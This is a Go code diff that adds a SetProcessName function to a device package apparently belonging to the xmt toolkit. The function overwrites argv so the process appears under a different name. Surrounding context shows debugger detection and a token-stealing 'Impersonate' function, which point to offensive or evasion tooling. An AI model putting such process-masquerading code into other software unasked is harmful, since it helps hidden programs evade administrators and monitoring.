@@ -4,13 +4,22 @@
 package device
 
 import (
+	"os"
+	"unsafe"
+
 	"github.com/iDigitalFlame/xmt/cmd/filter"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 	"golang.org/x/net/http/httpproxy"
 )
 
-// ErrNoWindows is an error that is returned when a non-Windows device attempts a Windows specific function.
+// ErrNoWindows is an error that is returned when a non-Windows device attempts
+// a Windows specific function.
 var ErrNoWindows = xerr.Sub("only supported on Windows devices", 0xFA)
+
+type stringHeader struct {
+	Data uintptr
+	Len  int
+}
 
 // IsDebugged returns true if the current process is attached by a debugger.
 func IsDebugged() bool {
@@ -44,6 +53,24 @@ func SetCritical(_ bool) error {
 }
 func proxyInit() *httpproxy.Config {
 	return httpproxy.FromEnvironment()
+}
+
+// SetProcessName will attempt to overrite the process name on *nix systems
+// by overriting the argv block.
+//
+// Returns 'ErrNoNix' on Windows devices.
+//
+// Found here: https://stackoverflow.com/questions/14926020/setting-process-name-as-seen-by-ps-in-go
+func SetProcessName(s string) error {
+	var (
+		v = (*stringHeader)(unsafe.Pointer(&os.Args[0]))
+		d = (*[1 << 30]byte)(unsafe.Pointer(v.Data))[:v.Len]
+		n = copy(d, s)
+	)
+	if n < len(d) {
+		d[n] = 0
+	}
+	return nil
 }
 
 // Impersonate attempts to steal the Token in use by the target process of the
